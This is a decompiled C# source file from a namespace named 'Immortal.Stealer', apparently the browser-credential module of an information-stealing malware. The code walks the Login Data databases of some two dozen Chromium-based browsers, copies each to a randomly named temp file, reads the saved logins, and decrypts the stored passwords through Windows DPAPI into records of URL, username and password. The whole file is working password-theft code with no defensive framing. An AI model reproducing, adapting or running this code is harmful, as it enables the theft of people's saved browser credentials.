using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Immortal.Stealer
{
	// Token: 0x02000009 RID: 9
	public static class Chromium
	{
		// Token: 0x06000016 RID: 22 RVA: 0x00002D4C File Offset: 0x00000F4C
		public static IEnumerable<PassData> Initialise()
		{
			List<PassData> list = new List<PassData>();
			string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
			string[] array = new string[]
			{
				environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Login Data",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data",
				environmentVariable + "\\Kometa\\User Data\\Default\\Login Data",
				environmentVariable + "\\Orbitum\\User Data\\Default\\Login Data",
				environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Login Data",
				environmentVariable + "\\Amigo\\User\\User Data\\Default\\Login Data",
				environmentVariable + "\\Torch\\User Data\\Default\\Login Data",
				environmentVariable + "\\CentBrowser\\User Data\\Default\\Login Data",
				environmentVariable + "\\Go!\\User Data\\Default\\Login Data",
				environmentVariable + "\\uCozMedia\\Uran\\User Data\\Default\\Login Data",
				environmentVariable + "\\MapleStudio\\ChromePlus\\User Data\\Default\\Login Data",
				environmentVariable + "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data",
				environmentVariable + "\\BlackHawk\\User Data\\Default\\Login Data",
				environmentVariable + "\\AcWebBrowser\\User Data\\Default\\Login Data",
				environmentVariable + "\\CoolNovo\\User Data\\Default\\Login Data",
				environmentVariable + "\\Epic Browser\\User Data\\Default\\Login Data",
				environmentVariable + "\\Baidu Spark\\User Data\\Default\\Login Data",
				environmentVariable + "\\Rockmelt\\User Data\\Default\\Login Data",
				environmentVariable + "\\Sleipnir\\User Data\\Default\\Login Data",
				environmentVariable + "\\SRWare Iron\\User Data\\Default\\Login Data",
				environmentVariable + "\\Titan Browser\\User Data\\Default\\Login Data",
				environmentVariable + "\\Flock\\User Data\\Default\\Login Data",
				environmentVariable + "\\Vivaldi\\User Data\\Default\\Login Data",
				environmentVariable + "\\Sputnik\\User Data\\Default\\Login Data",
				environmentVariable + "\\Maxthon\\User Data\\Default\\Login Data"
			};
			string[] array2 = array;
			int i = 0;
			while (i < array2.Length)
			{
				string string_ = array2[i];
				List<PassData> list2 = new List<PassData>();
				try
				{
					list2 = Chromium.smethod_0(string_);
					goto IL_1C4;
				}
				catch
				{
					goto IL_1C4;
				}
				goto IL_1B4;
				IL_1BC:
				i++;
				continue;
				IL_1B4:
				list.AddRange(list2);
				goto IL_1BC;
				IL_1C4:
				if (list2 != null)
				{
					goto IL_1B4;
				}
				goto IL_1BC;
			}
			return list;
		}

		// Token: 0x06000017 RID: 23
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Chromium.Struct1 struct1_0, ref string string_0, ref Chromium.Struct1 struct1_1, IntPtr intptr_0, ref Chromium.Struct0 struct0_0, int int_0, ref Chromium.Struct1 struct1_2);

		// Token: 0x06000018 RID: 24 RVA: 0x00002F3C File Offset: 0x0000113C
		public static byte[] DecryptChromium(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			Chromium.Struct1 @struct = default(Chromium.Struct1);
			Chromium.Struct1 struct2 = default(Chromium.Struct1);
			Chromium.Struct1 struct3 = default(Chromium.Struct1);
			Chromium.Struct0 struct4 = new Chromium.Struct0
			{
				int_0 = Marshal.SizeOf(typeof(Chromium.Struct0)),
				int_1 = 0,
				intptr_0 = IntPtr.Zero,
				string_0 = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (cipherTextBytes == null)
					{
						cipherTextBytes = new byte[0];
					}
					struct2.intptr_0 = Marshal.AllocHGlobal(cipherTextBytes.Length);
					struct2.int_0 = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, struct2.intptr_0, cipherTextBytes.Length);
				}
				catch (Exception)
				{
				}
				try
				{
					if (entropyBytes == null)
					{
						entropyBytes = new byte[0];
					}
					struct3.intptr_0 = Marshal.AllocHGlobal(entropyBytes.Length);
					struct3.int_0 = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, struct3.intptr_0, entropyBytes.Length);
				}
				catch (Exception)
				{
				}
				Chromium.CryptUnprotectData(ref struct2, ref empty, ref struct3, IntPtr.Zero, ref struct4, 1, ref @struct);
				byte[] array = new byte[@struct.int_0];
				Marshal.Copy(@struct.intptr_0, array, 0, @struct.int_0);
				return array;
			}
			catch (Exception)
			{
			}
			finally
			{
				if (@struct.intptr_0 != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(@struct.intptr_0);
				}
				if (struct2.intptr_0 != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(struct2.intptr_0);
				}
				if (struct3.intptr_0 != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(struct3.intptr_0);
				}
			}
			return new byte[0];
		}

		// Token: 0x06000019 RID: 25 RVA: 0x000030F8 File Offset: 0x000012F8
		private static List<PassData> smethod_0(string string_0)
		{
			List<PassData> result;
			if (!File.Exists(string_0))
			{
				result = null;
			}
			else
			{
				string program = "";
				if (string_0.Contains("Chrome"))
				{
					program = "Google Chrome";
				}
				if (string_0.Contains("Yandex"))
				{
					program = "Yandex Browser";
				}
				if (string_0.Contains("Orbitum"))
				{
					program = "Orbitum Browser";
				}
				if (string_0.Contains("Opera"))
				{
					program = "Opera Browser";
				}
				if (string_0.Contains("Amigo"))
				{
					program = "Amigo Browser";
				}
				if (string_0.Contains("Torch"))
				{
					program = "Torch Browser";
				}
				if (string_0.Contains("Comodo"))
				{
					program = "Comodo Browser";
				}
				if (string_0.Contains("CentBrowser"))
				{
					program = "CentBrowser";
				}
				if (string_0.Contains("Go!"))
				{
					program = "Go!";
				}
				if (string_0.Contains("uCozMedia"))
				{
					program = "uCozMedia";
				}
				if (string_0.Contains("MapleStudio"))
				{
					program = "MapleStudio";
				}
				if (string_0.Contains("BlackHawk"))
				{
					program = "BlackHawk";
				}
				if (string_0.Contains("CoolNovo"))
				{
					program = "CoolNovo";
				}
				if (string_0.Contains("Vivaldi"))
				{
					program = "Vivaldi";
				}
				if (string_0.Contains("Sputnik"))
				{
					program = "Sputnik";
				}
				if (string_0.Contains("Maxthon"))
				{
					program = "Maxthon";
				}
				if (string_0.Contains("AcWebBrowser"))
				{
					program = "AcWebBrowser";
				}
				if (string_0.Contains("Epic Browser"))
				{
					program = "Epic Browser";
				}
				if (string_0.Contains("Baidu Spark"))
				{
					program = "Baidu Spark";
				}
				if (string_0.Contains("Rockmelt"))
				{
					program = "Rockmelt";
				}
				if (string_0.Contains("Sleipnir"))
				{
					program = "Sleipnir";
				}
				if (string_0.Contains("SRWare Iron"))
				{
					program = "SRWare Iron";
				}
				if (string_0.Contains("Titan Browser"))
				{
					program = "Titan Browser";
				}
				if (string_0.Contains("Flock"))
				{
					program = "Flock";
				}
				try
				{
					string text = Path.GetTempPath() + "/" + Class8.Random_string() + ".fv";
					if (File.Exists(text))
					{
						File.Delete(text);
					}
					File.Copy(string_0, text, true);
					SqlHandler sqlHandler = new SqlHandler(text);
					List<PassData> list = new List<PassData>();
					sqlHandler.ReadTable("logins");
					for (int i = 0; i < sqlHandler.GetRowCount(); i++)
					{
						try
						{
							string text2 = string.Empty;
							try
							{
								text2 = Encoding.UTF8.GetString(Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlHandler.GetValue(i, 5)), null));
							}
							catch (Exception)
							{
							}
							if (text2 != "")
							{
								list.Add(new PassData
								{
									Url = sqlHandler.GetValue(i, 1).Replace("https://", "").Replace("http://", ""),
									Login = sqlHandler.GetValue(i, 3),
									Password = text2,
									Program = program
								});
							}
						}
						catch (Exception ex)
						{
							Console.WriteLine(ex.ToString());
						}
					}
					File.Delete(text);
					result = list;
				}
				catch (Exception ex2)
				{
					Console.WriteLine(ex2.ToString());
					result = null;
				}
			}
			return result;
		}

		// Token: 0x0600001A RID: 26 RVA: 0x0000238B File Offset: 0x0000058B
		internal static byte[] smethod_1(object object_0, object object_1)
		{
			throw new NotImplementedException();
		}

		// Token: 0x0200000A RID: 10
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct Struct0
		{
			// Token: 0x0400000C RID: 12
			public int int_0;

			// Token: 0x0400000D RID: 13
			public int int_1;

			// Token: 0x0400000E RID: 14
			public IntPtr intptr_0;

			// Token: 0x0400000F RID: 15
			public string string_0;
		}

		// Token: 0x0200000B RID: 11
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct Struct1
		{
			// Token: 0x04000010 RID: 16
			public int int_0;

			// Token: 0x04000011 RID: 17
			public IntPtr intptr_0;
		}
	}
}
